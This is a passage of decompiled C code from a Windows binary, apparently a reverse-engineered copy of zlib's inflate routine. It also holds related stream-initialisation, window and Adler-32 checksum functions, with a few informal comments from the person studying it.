										++*(v4 + 64);
									}
								}
								v43 = Src;
							}
						} while (v182 && v42 < v41);
						v9 = a3;
						if (*(v4 + 16) & 0x200)
						{
							*(v4 + 24) = sub_681FBF51(*(v4 + 24), v43, v42);
							v42 = v169;
						}
						Src = Src + v42;
						v7 = v196 - v42;
						v196 -= v42;
						if (v182)
							goto LABEL_343;
					}
					else
					{
						v47 = *(v4 + 32);
						if (v47)
							*(v47 + 28) = 0;
					}
					*v4 = 7;
					*(v4 + 64) = 0;
				LABEL_110:
					if (*(v4 + 16) & 0x1000)
					{
						if (!v7)
							goto LABEL_343;
						v48 = v196;
						v49 = 0;
						v50 = Src;
						do
						{
							v51 = v50[v49++];
							v183 = v51;
							v52 = *(v4 + 32);
							v170 = v49;
							if (v52)
							{
								if (*(v52 + 36))
								{
									v53 = *(v4 + 64);
									if (v53 < *(v52 + 40))
									{
										*(*(v52 + 36) + v53) = v183;
										++*(v4 + 64);
									}
								}
								v50 = Src;
							}
						} while (v183 && v49 < v48);
						v9 = a3;
						if (*(v4 + 16) & 0x200)
						{
							*(v4 + 24) = sub_681FBF51(*(v4 + 24), v50, v49);
							v49 = v170;
						}
						Src = Src + v49;
						v7 = v196 - v49;
						v196 -= v49;
						if (v183)
							goto LABEL_343;
					}
					else
					{
						v54 = *(v4 + 32);
						if (v54)
							*(v54 + 36) = 0;
					}
					v5 = v194;
					*v4 = 8;
				LABEL_127:
					if (*(v4 + 16) & 0x200)
					{
						if (v6 < 0x10)
						{
							v55 = Src;
							while (v7)
							{
								v56 = *v55;
								v196 = v7 - 1;
								v57 = v56 << v6;
								v6 += 8;
								--v7;
								v5 += v57;
								v55 = Src + 1;
								v194 = v5;
								Src = Src + 1;
								v193 = v6;
								if (v6 >= 0x10)
									goto LABEL_132;
							}
							goto LABEL_343;
						}
					LABEL_132:
						if (v5 != *(v4 + 24))
						{
							*(v9 + 24) = "header crc mismatch";
							goto LABEL_25;
						}
						v6 = 0;
						v194 = 0;
						v193 = 0;
					}
					v58 = *(v4 + 32);
					if (v58)
					{
						*(v58 + 44) = (*(v4 + 16) >> 9) & 1;
						*(*(v4 + 32) + 48) = 1;
					}
					v59 = sub_681FBF51(0, 0, 0);
					*(v4 + 24) = v59;
					*(v9 + 48) = v59;
					*v4 = 11;
					goto LABEL_138;
				}
				*(v9 + 24) = "unknown header flags set";
			}
			else
			{
				*(v9 + 24) = "unknown compression method";
			}
		LABEL_39:
			*v4 = 29;
			goto LABEL_140;
		case 2:
			goto LABEL_47;
		case 3:
			goto LABEL_56;
		case 4:
			goto LABEL_65;
		case 5:
			goto LABEL_78;
		case 6:
			goto LABEL_93;
		case 7:
			goto LABEL_110;
		case 8:
			goto LABEL_127;
		case 9:
			if (v6 >= 0x20)
				goto LABEL_148;
			v61 = Src;
			do
			{
				if (!v7)
					goto LABEL_343;
				v62 = *v61;
				v196 = v7 - 1;
				v63 = v62 << v6;
				v6 += 8;
				--v7;
				v5 += v63;
				v61 = Src + 1;
				v194 = v5;
				Src = Src + 1;
			} while (v6 < 0x20);
		LABEL_148:
			v7 = v196;
			v64 = (v5 >> 24) + (((v5 << 16) + (v5 & 0xFF00)) << 8) + ((v5 >> 8) & 0xFF00);
			*(v4 + 24) = v64;
			*(v9 + 48) = v64;
			v5 = 0;
			*v4 = 10;
			v194 = 0;
			v6 = 0;
		LABEL_149:
			if (!*(v4 + 12))
			{
				*(v9 + 12) = Dst;
				*(v9 + 16) = Size;
				*v9 = Src;
				*(v9 + 4) = v7;
				*(v4 + 56) = v5;
				*(v4 + 60) = v6;
				return 2;
			}
			v65 = sub_681FBD21(0, 0, 0);
			v5 = v194;
			v7 = v196;
			*(v4 + 24) = v65;
			*(v9 + 48) = v65;
			*v4 = 11;
		LABEL_151:
			if (a4 == 5 || a4 == 6)
				goto LABEL_343;
		LABEL_153:
			if (*(v4 + 4))
			{
				*v4 = 26;
				v66 = v6 & 7;
				v5 >>= v66;
				v6 -= v66;
				v194 = v5;
				v193 = v6;
				goto LABEL_139;
			}
			if (v6 < 3)
			{
				v67 = Src;
				while (v7)
				{
					v68 = *v67;
					v196 = v7 - 1;
					v69 = v68 << v6;
					v6 += 8;
					--v7;
					v5 += v69;
					v67 = Src + 1;
					v194 = v5;
					Src = Src + 1;
					if (v6 >= 3)
						goto LABEL_159;
				}
				goto LABEL_343;
			}
		LABEL_159:
			v70 = v5;
			v71 = v5 >> 1;
			*(v4 + 4) = v70 & 1;
			if (v71 & 3)
			{
				switch (v71 & 3)
				{
				case 1u:
					InsertCharsIntoBuffer(v4);
					*v4 = 19;
					if (a4 == 6)
					{
						v6 -= 3;
						v194 = v71 >> 2;
						goto LABEL_343;
					}
					break;
				case 2u:
					*v4 = 16;
					break;
				case 3u:
					*(v9 + 24) = "invalid block type";
					*v4 = 29;
					break;
				}
			}
			else
			{
				*v4 = 13;
			}
			v5 = v71 >> 2;
			v6 -= 3;
			goto LABEL_29;
		case 10:
			goto LABEL_149;
		case 11:
			goto LABEL_151;
		case 12:
			goto LABEL_153;
		case 13:
			v72 = v6 & 7;
			v6 -= v72;
			v5 >>= v72;
			v194 = v5;
			v193 = v6;
			if (v6 >= 0x20)
				goto LABEL_173;
			v73 = Src;
			do
			{
				v7 = v196;
				if (!v196)
					goto LABEL_344;
				v74 = *v73;
				--v196;
				v75 = v74 << v6;
				v6 += 8;
				v5 += v75;
				v193 = v6;
				v73 = Src + 1;
				v194 = v5;
				Src = Src + 1;
			} while (v6 < 0x20);
		LABEL_173:
			if (v5 == ~v5 >> 16)
			{
				*(v4 + 64) = v5;
				v5 = 0;
				v7 = v196;
				v6 = 0;
				v194 = 0;
				v193 = 0;
				*v4 = 14;
				if (a4 != 6)
				{
				LABEL_176:
					*v4 = 15;
				LABEL_177:
					v76 = *(v4 + 64);
					if (!v76)
					{
						*v4 = 11;
						goto LABEL_140;
					}
					if (v76 > v7)
						v76 = v7;
					if (v76 > Size)
						v76 = Size;
					v171 = v76;
					if (v76)
					{
						memcpy(Dst, Src, v76);
						Src = Src + v171;
						v7 = v196 - v171;
						Size -= v171;
						Dst += v171;
						*(v4 + 64) -= v171;
						v5 = v194;
						v196 = v7;
						goto LABEL_140;
					}
					goto LABEL_343;
				}
				goto LABEL_344;
			}
			*(v9 + 24) = "invalid stored block lengths";
			goto LABEL_25;
		case 14:
			goto LABEL_176;
		case 15:
			goto LABEL_177;
		case 16:
			if (v6 >= 0xE)
				goto LABEL_189;
			v77 = Src;
			do
			{
				if (!v7)
					goto LABEL_343;
				v78 = *v77;
				v196 = v7 - 1;
				v79 = v78 << v6;
				v6 += 8;
				--v7;
				v5 += v79;
				v77 = Src + 1;
				v194 = v5;
				Src = Src + 1;
			} while (v6 < 0xE);
		LABEL_189:
			v6 -= 14;
			v80 = v5 & 0x1F;
			v81 = v5 >> 5;
			v193 = v6;
			*(v4 + 96) = v80 + 257;
			v82 = v81 & 0x1F;
			v81 >>= 5;
			*(v4 + 100) = v82 + 1;
			v83 = v81 & 0xF;
			v5 = v81 >> 4;
			v194 = v5;
			v84 = *(v4 + 96) < 0x11Eu;
			v15 = *(v4 + 96) == 286;
			*(v4 + 92) = v83 + 4;
			if (!v84 && !v15 || *(v4 + 100) > 0x1Eu)
			{
				*(v9 + 24) = "too many length or distance symbols";
				goto LABEL_39;
			}
			*(v4 + 104) = 0;
			*v4 = 17;
		LABEL_198:
			if (*(v4 + 104) >= *(v4 + 92))
			{
				while (*(v4 + 104) < 0x13u)
					*(v4 + 2 * WordArray[(*(v4 + 104))++] + 112) = 0;
				*(v4 + 76) = v4 + 1328;
				*(v4 + 108) = v4 + 1328;
				*(v4 + 84) = 7;
				v187 = sub_681FC244(0, v4 + 112, 0x13u, (v4 + 108), (v4 + 84), (v4 + 752));
				if (v187)
				{
					*(v9 + 24) = "invalid code lengths set";
					goto LABEL_204;
				}
				*(v4 + 104) = 0;
				*v4 = 18;
				while (1)
				{
					while (1)
					{
					LABEL_232:
						v184 = *(v4 + 104);
						if (v184 >= *(v4 + 96) + *(v4 + 100))
							goto LABEL_236;
						while (1)
						{
							v90 = v194 & ((1 << *(v4 + 84)) - 1);
							v91 = *(*(v4 + 76) + 4 * v90);
							v172 = *(*(v4 + 76) + 4 * v90);
							if ((*(*(v4 + 76) + 4 * v90) >> 8) <= v6)
								break;
							v7 = v196;
							if (!v196)
								goto LABEL_344;
							--v196;
							v194 += *Src << v6;
							Src = Src + 1;
							v6 += 8;
						}
						if (HIWORD(v91) >= 0x10u)
							break;
						v6 -= BYTE1(v91);
						v194 >>= SBYTE1(v91);
						v193 = v6;
						*(v4 + 2 * v184 + 112) = HIWORD(v91);
						++*(v4 + 104);
					}
					if (HIWORD(v91) == 16)
					{
						for (i = BYTE1(v91) + 2; v6 < i; Src = Src + 1)
						{
							v7 = v196;
							if (!v196)
								goto LABEL_344;
							--v196;
							v92 = *Src << v6;
							v6 += 8;
							v194 += v92;
						}
						v6 -= BYTE1(v91);
						v5 = v194 >> SBYTE1(v91);
						v194 >>= SBYTE1(v91);
						v193 = v6;
						if (!v184)
						{
							*(v9 + 24) = "invalid bit length repeat";
							goto LABEL_25;
						}
						v93 = v5 & 3;
						v94 = v5 >> 2;
						v95 = v93 + 3;
						v174 = *(v4 + 2 * v184 + 110);
						v6 -= 2;
					}
					else
					{
						v96 = v194;
						v97 = BYTE1(v91);
						if (HIWORD(v172) == 17)
						{
							v193 = BYTE1(v91);
							while (v6 < v97 + 3)
							{
								v7 = v196;
								if (!v196)
									goto LABEL_344;
								--v196;
								v97 = v193;
								v96 += *Src << v6;
								Src = Src + 1;
								v6 += 8;
								v194 = v96;
							}
							v98 = v96 >> v97;
							v99 = v98;
							v94 = v98 >> 3;
							v95 = (v99 & 7) + 3;
							v100 = -3 - v193;
						}
						else
						{
							v193 = BYTE1(v91);
							while (v6 < v97 + 7)
							{
								v7 = v196;
								if (!v196)
									goto LABEL_344;
								--v196;
								v97 = v193;
								v96 += *Src << v6;
								Src = Src + 1;
								v6 += 8;
								v194 = v96;
							}
							v101 = v96 >> v97;
							v102 = v101;
							v94 = v101 >> 7;
							v95 = (v102 & 0x7F) + 11;
							v100 = -7 - v193;
						}
						v174 = 0;
						v6 += v100;
					}
					v103 = *(v4 + 96) + *(v4 + 100);
					v194 = v94;
					v193 = v6;
					if (v184 + v95 > v103)
						break;
					for (; v95; --v95)
						*(v4 + 2 * (*(v4 + 104))++ + 112) = v174;
				}
				*(v9 + 24) = "invalid bit length repeat";
				*v4 = 29;
			LABEL_236:
				if (*v4 == 29)
					goto LABEL_138;
				if (!*(v4 + 624))
				{
					*(v9 + 24) = "invalid code -- missing end-of-block";
					goto LABEL_204;
				}
				*(v4 + 76) = v4 + 1328;
				*(v4 + 108) = v4 + 1328;
				*(v4 + 84) = 9;
				v187 = sub_681FC244(1, v4 + 112, *(v4 + 96), (v4 + 108), (v4 + 84), (v4 + 752));
				if (v187)
				{
					*(v9 + 24) = "invalid literal/lengths set";
					goto LABEL_204;
				}
				*(v4 + 80) = *(v4 + 108);
				v104 = *(v4 + 96);
				v105 = *(v4 + 100);
				*(v4 + 88) = 6;
				v187 = sub_681FC244(2, v4 + 2 * (v104 + 56), v105, (v4 + 108), (v4 + 88), (v4 + 752));
				if (!v187)
				{
					v7 = v196;
					*v4 = 19;
					if (a4 == 6)
						goto LABEL_344;
					v5 = v194;
				LABEL_245:
					*v4 = 20;
				LABEL_246:
					if (v7 >= 6 && Size >= 0x102)
					{
						*(v9 + 12) = Dst;
						v4 = v186;
						*(v9 + 16) = Size;
						*v9 = Src;
						*(v9 + 4) = v7;
						v186[14] = v5;
						v186[15] = v6;
						sub_681FC6D0(a1, a2, v9, v185);
						v15 = *v186 == 11;
						v5 = v186[14];
						v6 = v186[15];
						Dst = *(v9 + 12);
						v7 = *(v9 + 4);
						Size = *(v9 + 16);
						Src = *v9;
						v196 = v7;
						v194 = v5;
						v193 = v6;
						if (v15)
							v186[1777] = -1;
						goto LABEL_140;
					}
					v106 = *(v4 + 76);
					v107 = *(v4 + 84);
					*(v4 + 7108) = 0;
					v179 = v106;
					for (j = *(*(v4 + 76) + 4 * (v5 & ((1 << v107) - 1)));
						BYTE1(j) > v6;
						j = *(v112 + 4 * (v5 & ((1 << v111) - 1))))
					{
						v7 = v196;
						if (!v196)
							goto LABEL_344;
						--v196;
						v109 = v6;
						v6 += 8;
						v193 = v6;
						v110 = *Src << v109;
						v111 = *(v4 + 84);
						v5 += v110;
						Src = Src + 1;
						v112 = *(v4 + 76);
						v194 = v5;
					}
					if (j && !(j & 0xF0))
					{
						v113 = j >> 8;
						v176 = HIWORD(j);
						v114 = j;
						j = *(v179 + 4 * ((j >> 16) + ((v194 & ((1 << (BYTE1(j) + j)) - 1)) >> SBYTE1(j))));
						v6 = v193;
						v115 = v113;
						v4 = v186;
						if (v115 + BYTE1(j) > v193)
						{
							while (v196)
							{
								--v196;
								v193 = v6 + 8;
								v194 += *Src << v6;
								Src = Src + 1;
								j = *(v186[19] + 4 * (v176 + ((v194 & ((1 << (HIBYTE(v114) + v114)) - 1)) >> SHIBYTE(v114))));
								v6 += 8;
								if (HIBYTE(v114) + BYTE1(j) <= v6)
									goto LABEL_259;
							}
							goto LABEL_343;
						}
					LABEL_259:
						v9 = a3;
						v116 = HIBYTE(v114);
						v5 = v194 >> SHIBYTE(v114);
						v6 -= v116;
						v186[1777] = v116;
					}
					*(v4 + 7108) += BYTE1(j);
					v6 -= BYTE1(j);
					v5 >>= SBYTE1(j);
					v194 = v5;
					v193 = v6;
					*(v4 + 64) = j >> 16;
					if (!j)
					{
						*v4 = 25;
						goto LABEL_139;
					}
					if (j & 0x20)
					{
						*(v4 + 7108) = -1;
						*v4 = 11;
						goto LABEL_139;
					}
					v7 = v196;
					if (j & 0x40)
					{
						*(v9 + 24) = "invalid literal/length code";
						goto LABEL_39;
					}
					*v4 = 21;
					*(v4 + 72) = j & 0xF;
				LABEL_267:
					v117 = *(v4 + 72);
					if (v117)
					{
						if (v6 < v117)
						{
							v118 = Src;
							while (v7)
							{
								v119 = *v118;
								v196 = v7 - 1;
								v120 = v119 << v6;
								v6 += 8;
								--v7;
								v5 += v120;
								v118 = Src + 1;
								v194 = v5;
								Src = Src + 1;
								if (v6 >= v117)
									goto LABEL_272;
							}
							goto LABEL_343;
						}
					LABEL_272:
						v6 -= v117;
						v193 = v6;
						v121 = v5 & ((1 << v117) - 1);
						v5 >>= v117;
						*(v4 + 64) += v121;
						*(v4 + 7108) += v117;
						v194 = v5;
					}
					*(v4 + 7112) = *(v4 + 64);
					*v4 = 22;
				LABEL_274:
					v180 = *(v4 + 80);
					v122 = *(v180 + 4 * (v5 & ((1 << *(v4 + 88)) - 1)));
					if (BYTE1(v122) > v6)
					{
						v123 = v196;
						while (v123)
						{
							v124 = v6;
							--v123;
							v6 += 8;
							v196 = v123;
							v193 = v6;
							v125 = *Src << v124;
							v126 = *(v4 + 88);
							v5 += v125;
							Src = Src + 1;
							v127 = *(v4 + 80);
							v194 = v5;
							v122 = *(v127 + 4 * (v5 & ((1 << v126) - 1)));
							if (BYTE1(v122) <= v6)
								goto LABEL_278;
						}
						goto LABEL_343;
					}
				LABEL_278:
					if (!(v122 & 0xF0))
					{
						v128 = v122 >> 8;
						v177 = HIWORD(v122);
						v129 = v122;
						v122 = *(v180 + 4 * ((v122 >> 16) + ((v194 & ((1 << (BYTE1(v122) + v122)) - 1)) >> SBYTE1(v122))));
						v6 = v193;
						v130 = v128;
						v4 = v186;
						if (v130 + BYTE1(v122) > v193)
						{
							while (v196)
							{
								--v196;
								v193 = v6 + 8;
								v194 += *Src << v6;
								Src = Src + 1;
								v122 = *(v186[20] + 4 * (v177 + ((v194 & ((1 << (HIBYTE(v129) + v129)) - 1)) >> SHIBYTE(v129))));
								v6 += 8;
								if (HIBYTE(v129) + BYTE1(v122) <= v6)
									goto LABEL_282;
							}
							goto LABEL_343;
						}
					LABEL_282:
						v131 = HIBYTE(v129);
						v6 -= HIBYTE(v129);
						v5 = v194 >> SHIBYTE(v129);
						v186[1777] += v131;
					}
					v9 = a3;
					*(v4 + 7108) += BYTE1(v122);
					v6 -= BYTE1(v122);
					v5 >>= SBYTE1(v122);
					v194 = v5;
					v193 = v6;
					if (v122 & 0x40)
					{
						*(a3 + 24) = "invalid distance code";
						goto LABEL_25;
					}
					*v4 = 23;
					*(v4 + 68) = v122 >> 16;
					*(v4 + 72) = v122 & 0xF;
				LABEL_286:
					v132 = *(v4 + 72);
					if (v132)
					{
						if (v6 < v132)
						{
							v133 = Src;
							do
							{
								v7 = v196;
								if (!v196)
									goto LABEL_344;
								v134 = *v133;
								--v196;
								v135 = v134 << v6;
								v6 += 8;
								v132 = *(v4 + 72);
								v5 += v135;
								v133 = Src + 1;
								v194 = v5;
								Src = Src + 1;
							} while (v6 < v132);
						}
						v6 -= v132;
						v193 = v6;
						v136 = v5 & ((1 << v132) - 1);
						v5 >>= v132;
						*(v4 + 68) += v136;
						*(v4 + 7108) += v132;
						v194 = v5;
					}
					*v4 = 24;
				LABEL_293:
					if (!Size)
						goto LABEL_343;
					v137 = *(v4 + 68);
					if (v137 > v185 - Size)
					{
						v138 = v137 - (v185 - Size);
						if (v138 > *(v4 + 44) && *(v4 + 7104))
						{
							*(v9 + 24) = "invalid distance too far back";
							goto LABEL_25;
						}
						v139 = *(v4 + 52);
						if (v138 <= *(v4 + 48))
						{
							v140 = *(v4 + 48) + v139 - v138;
						}
						else
						{
							v138 -= *(v4 + 48);
							v140 = *(v4 + 40) + v139 - v138;
						}
						v175 = v140;
						v141 = *(v4 + 64);
						if (v138 > v141)
							LABEL_304:
						v138 = v141;
						if (v138 > Size)
							v138 = Size;
						Size -= v138;
						*(v4 + 64) = v141 - v138;
						v142 = Dst;
						do
						{
							*v142 = v142[v175 - Dst];
							++v142;
							--v138;
						} while (v138);
						v9 = a3;
						Dst = v142;
						v4 = v186;
						if (!v186[16])
							*v186 = 20;
						goto LABEL_139;
					}
					v175 = &Dst[-v137];
					v141 = *(v4 + 64);
					goto LABEL_304;
				}
				*(v9 + 24) = "invalid distances set";
			LABEL_204:
				*v4 = 29;
			LABEL_138:
				v5 = v194;
			LABEL_139:
				v7 = v196;
			LABEL_140:
				v8 = *v4;
				if (*v4 > 0x1Eu)
					return -2;
				continue;
			}
			if (v6 >= 3)
			{
			LABEL_197:
				v88 = *(v4 + 104);
				v89 = v5 & 7;
				v5 >>= 3;
				v194 = v5;
				*(v4 + 2 * WordArray[v88] + 112) = v89;
				++*(v4 + 104);
				v6 -= 3;
				v7 = v196;
				v193 = v6;
				goto LABEL_198;
			}
			v85 = Src;
			while (v7)
			{
				v86 = *v85;
				v196 = v7 - 1;
				v87 = v86 << v6;
				v6 += 8;
				--v7;
				v5 += v87;
				v85 = Src + 1;
				v194 = v5;
				Src = Src + 1;
				if (v6 >= 3)
					goto LABEL_197;
			}
		LABEL_343:
			v7 = v196;
		LABEL_344:
			*(a3 + 12) = Dst;
			v155 = Src;
			*(a3 + 16) = Size;
			v156 = 0;
			*a3 = v155;
			v157 = v194;
			*(a3 + 4) = v7;
			*(v4 + 60) = v6;
			*(v4 + 56) = v157;
			if (!*(v4 + 40) && (v185 == *(a3 + 16) || *v4 >= 29 || *v4 >= 26 && a4 == 4))
			{
			LABEL_353:
				v158 = v167 - *(a3 + 4);
				v159 = v185 - *(a3 + 16);
				*(a3 + 8) += v158;
				*(a3 + 20) += v159;
				*(v4 + 28) += v159;
				v168 = v158;
				if (*(v4 + 8) && v159)
				{
					v165 = (*(a3 + 12) - v159);
					v163 = *(v4 + 24);
					if (*(v4 + 16))
						v160 = sub_681FBF51(v163, v165, v159);
					else
						v160 = sub_681FBD21(v163, v165, v159);
					*(v4 + 24) = v160;
					v156 = 0;
					*(a3 + 48) = v160;
				}
				if (*v4 == 19 || *v4 == 14)
					v156 = 256;
				v161 = 0;
				if (*v4 == 11)
					v161 = 128;
				*(a3 + 44) = *(v4 + 60) + v156 + (*(v4 + 4) != 0 ? 0x40 : 0) + v161;
				if ((v168 || v159) && a4 != 4)
					return v187;
				result = v187;
				if (!v187)
					result = -5;
				return result;
			}
			if (!sub_681FBC5B(a3, *(a3 + 12), v185 - *(a3 + 16)))
			{
				v156 = 0;
				goto LABEL_353;
			}
			*v4 = 30;
			return -4;
		case 17:
			goto LABEL_198;
		case 18:
			goto LABEL_232;
		case 19:
			goto LABEL_245;
		case 20:
			goto LABEL_246;
		case 21:
			goto LABEL_267;
		case 22:
			goto LABEL_274;
		case 23:
			goto LABEL_286;
		case 24:
			goto LABEL_293;
		case 25:
			if (!Size)
				goto LABEL_343;
			v143 = Dst++;
			--Size;
			*v143 = *(v4 + 64);
			v9 = a3;
			*v4 = 20;
			goto LABEL_140;
		case 26:
			if (!*(v4 + 8))
				goto LABEL_328;
			if (v6 >= 0x20)
				goto LABEL_318;
			v144 = Src;
			do
			{
				if (!v7)
					goto LABEL_343;
				v145 = *v144;
				v196 = v7 - 1;
				v146 = v145 << v6;
				v6 += 8;
				--v7;
				v5 += v146;
				v144 = Src + 1;
				v194 = v5;
				Src = Src + 1;
				v193 = v6;
			} while (v6 < 0x20);
		LABEL_318:
			v147 = Size;
			v148 = v185 - Size;
			*(v9 + 20) += v185 - Size;
			*(v4 + 28) += v185 - Size;
			if (v185 != Size)
			{
				v164 = &Dst[-v148];
				v162 = *(v4 + 24);
				if (*(v4 + 16))
					v149 = sub_681FBF51(v162, v164, v148);
				else
					v149 = sub_681FBD21(v162, v164, v148);
				v5 = v194;
				*(v4 + 24) = v149;
				*(v9 + 48) = v149;
				v147 = Size;
			}
			v185 = v147;
			v150 = (v5 >> 24) + ((v5 >> 8) & 0xFF00) + (((v5 << 16) + (v5 & 0xFF00)) << 8);
			if (*(v4 + 16))
				v150 = v5;
			v15 = v150 == *(v4 + 24);
			v7 = v196;
			if (v15)
			{
				v5 = 0;
				v6 = 0;
				v194 = 0;
				v193 = 0;
			LABEL_328:
				*v4 = 27;
			LABEL_329:
				if (*(v4 + 8) && *(v4 + 16))
				{
					if (v6 < 0x20)
					{
						v151 = Src;
						do
						{
							if (!v7)
								goto LABEL_343;
							v152 = *v151;
							v196 = v7 - 1;
							v153 = v152 << v6;
							v6 += 8;
							--v7;
							v5 += v153;
							v151 = Src + 1;
							v194 = v5;
							Src = Src + 1;
							v193 = v6;
						} while (v6 < 0x20);
					}
					if (v5 != *(v4 + 28))
					{
						*(v9 + 24) = "incorrect length check";
						goto LABEL_25;
					}
					v194 = 0;
					v6 = 0;
				}
				*v4 = 28;
			LABEL_340:
				v154 = 1;
			LABEL_342:
				v187 = v154;
				goto LABEL_343;
			}
			*(v9 + 24) = "incorrect data check";
			goto LABEL_39;
		case 27:
			goto LABEL_329;
		case 28:
			goto LABEL_340;
		case 29:
			v154 = -3;
			goto LABEL_342;
		case 30:
			return -4;
		default:
			return -2;
		}
	}
}

//----- (681FBA60) --------------------------------------------------------
signed int __stdcall sub_681FBA60(int a1)
{
	int v1; // eax
	void(__cdecl *v2)(_DWORD, _DWORD); // ecx

	if (!a1)
		return -2;
	v1 = *(a1 + 28);
	if (!v1)
		return -2;
	v2 = *(a1 + 36);
	if (!v2)
		return -2;
	if (*(v1 + 52))
		v2(*(a1 + 40), *(v1 + 52));
	(*(a1 + 36))(*(a1 + 40), *(a1 + 28));
	*(a1 + 28) = 0;
	return 0;
}

//----- (681FBAA4) --------------------------------------------------------
signed int __stdcall sub_681FBAA4(int a1, signed int a2, PCWSTR a3, int a4) //remove? // Is this modifying parts of struct or checking Wchar array?
{
	int v4; // eax
	int v5; // edi
	signed int v6; // ebx

	if (!a3 || *a3 != 49 || a4 != 56)
		return -6;
	if (!a1)
		return -2;
	*(a1 + 24) = 0;
	if (!(a1 + 32))
	{
		*(a1 + 32) = ReturnMultipliedMalloc;
		*(a1 + 40) = 0;
	}
	if (!*(a1 + 36))
		*(a1 + 36) = FreeMemPtr;
	v4 = (*(a1 + 32))(*(a1 + 40), 1, 7116);
	v5 = v4;
	if (!v4)
		return -4;
	*(a1 + 28) = v4;
	*(v4 + 52) = 0;
	v6 = sub_681FBB48(a1, a2);
	if (v6)
	{
		(*(a1 + 36))(*(a1 + 40), v5);
		*(a1 + 28) = 0;
	}
	return v6;
}

//----- (681FBB31) --------------------------------------------------------
signed int __stdcall sub_681FBB31(int a1, PCWSTR a2, int a3)
{
	return sub_681FBAA4(a1, 15, a2, a3);
}

//----- (681FBB48) --------------------------------------------------------
signed int __stdcall sub_681FBB48(int a1, signed int a2) // remove?
{
	int v2; // edi
	_DWORD *v3; // ebx
	signed int v4; // esi
	int v6; // [esp+14h] [ebp+8h]

	v2 = a1;
	if (!a1)
		return -2;
	v3 = *(a1 + 28);
	if (!v3)
		return -2;
	v4 = a2;
	if (a2 >= 0)
	{
		v6 = (a2 >> 4) + 1;
		if (a2 < 48)
			v4 = a2 & 0xF;
	}
	else
	{
		v6 = 0;
		v4 = -a2;
	}
	if (v4 && (v4 < 8 || v4 > 15))
		return -2;
	if (v3[13])
	{
		if (v3[9] != v4)
		{
			(*(v2 + 36))(*(v2 + 40), v3[13]);
			v3[13] = 0;
		}
	}
	v3[2] = v6;
	v3[9] = v4;
	return sub_681FBBBF(v2);
}

//----- (681FBBBF) --------------------------------------------------------
signed int __stdcall sub_681FBBBF(int a1)
{
	_DWORD *v1; // ecx

	if (!a1)
		return -2;
	v1 = *(a1 + 28);
	if (!v1)
		return -2;
	v1[10] = 0;
	v1[11] = 0;
	v1[12] = 0;
	return sub_681FBBEA(a1);
}

//----- (681FBBEA) --------------------------------------------------------
signed int __stdcall sub_681FBBEA(int a1) // Remove?  I should debug these and see what happens here.
{
	_DWORD *v1; // ecx
	int v2; // edx
	signed int result; // eax

	if (!a1)
		return -2;
	v1 = *(a1 + 28);
	if (!v1)
		return -2;
	v1[7] = 0;
	*(a1 + 20) = 0;
	*(a1 + 8) = 0;
	*(a1 + 24) = 0;
	v2 = v1[2];
	if (v2)
		*(a1 + 48) = v1[2] & 1;
	v1[1777] = -1;
	*v1 = 0;
	v1[1] = 0;
	v1[3] = 0;
	v1[8] = 0;
	v1[14] = 0;
	v1[15] = 0;
	v1[27] = v1 + 332;
	v1[20] = v1 + 332;
	v1[19] = v1 + 332;
	result = 0;
	v1[5] = 0x8000;
	v1[1776] = 1;
	return result;
}

//----- (681FBC5B) --------------------------------------------------------
int __cdecl sub_681FBC5B(int a1, int a2, size_t Size)
{
	int v3; // esi
	int v4; // eax
	size_t v6; // edi
	int v7; // eax
	unsigned int v8; // edi
	size_t v9; // ebx
	unsigned int v10; // ecx
	unsigned int v11; // eax

	v3 = *(a1 + 28);
	if (!*(v3 + 52))
	{
		v4 = (*(a1 + 32))(*(a1 + 40), 1 << *(v3 + 36), 1);
		*(v3 + 52) = v4;
		if (!v4)
			return 1;
	}
	if (!*(v3 + 40))
	{
		*(v3 + 40) = 1 << *(v3 + 36);
		*(v3 + 48) = 0;
		*(v3 + 44) = 0;
	}
	v6 = *(v3 + 40);
	if (Size >= v6)
	{
		memcpy(*(v3 + 52), (a2 - v6), *(v3 + 40));
		*(v3 + 48) = 0;
	LABEL_8:
		v7 = *(v3 + 40);
		goto LABEL_17;
	}
	v8 = v6 - *(v3 + 48);
	if (v8 > Size)
		v8 = Size;
	memcpy((*(v3 + 48) + *(v3 + 52)), (a2 - Size), v8);
	v9 = Size - v8;
	if (Size != v8)
	{
		memcpy(*(v3 + 52), (a2 - v9), v9);
		*(v3 + 48) = v9;
		goto LABEL_8;
	}
	*(v3 + 48) += v8;
	v10 = *(v3 + 40);
	if (*(v3 + 48) == v10)
		*(v3 + 48) = 0;
	v11 = *(v3 + 44);
	if (v11 >= v10)
		return 0;
	v7 = v8 + v11;
LABEL_17:
	*(v3 + 44) = v7;
	return 0;
}

//----- (681FBD21) --------------------------------------------------------
unsigned int __stdcall sub_681FBD21(unsigned int a1, _BYTE *a2, unsigned int a3)
{
	unsigned int v3; // ebx
	unsigned int result; // eax
	unsigned int v5; // esi
	unsigned int v6; // edi
	unsigned __int8 *v7; // ecx
	signed int v8; // edx
	_BYTE *v9; // ebx
	int v10; // esi
	int v11; // ecx
	int v12; // edi
	int v13; // esi
	int v14; // edi
	int v15; // esi
	int v16; // edi
	int v17; // esi
	int v18; // edi
	int v19; // esi
	int v20; // edi
	int v21; // esi
	int v22; // edi
	int v23; // esi
	int v24; // edi
	int v25; // esi
	int v26; // edi
	int v27; // esi
	int v28; // edi
	int v29; // esi
	int v30; // edi
	int v31; // esi
	int v32; // edi
	int v33; // esi
	int v34; // edi
	int v35; // esi
	int v36; // edi
	int v37; // esi
	int v38; // eax
	int v39; // edi
	int v40; // esi
	int v41; // edi
	bool v42; // zf
	unsigned int v43; // edx
	int v44; // esi
	int v45; // edi
	int v46; // esi
	int v47; // edi
	int v48; // esi
	int v49; // edi
	int v50; // esi
	int v51; // edi
	int v52; // esi
	int v53; // edi
	int v54; // esi
	int v55; // edi
	int v56; // esi
	int v57; // edi
	int v58; // esi
	int v59; // edi
	int v60; // esi
	int v61; // edi
	int v62; // esi
	int v63; // edi
	int v64; // esi
	int v65; // edi
	int v66; // esi
	int v67; // edi
	int v68; // esi
	int v69; // edi
	int v70; // esi
	int v71; // edi
	int v72; // esi
	int v73; // eax
	int v74; // edi
	unsigned int v75; // [esp+14h] [ebp+8h]
	int v76; // [esp+1Ch] [ebp+10h]

	v3 = a3;
	result = 1;
	v5 = a1;
	v6 = a1 >> 16;
	if (a3 == 1)
	{
		v5 = *a2 + a1;
		if (v5 >= 0xFFF1)
			v5 -= 65521;
		v6 += v5;
		if (v6 >= 0xFFF1)
			v6 -= 65521;
		return v5 | (v6 << 16);
	}
	v7 = a2;
	if (!a2)
		return result;
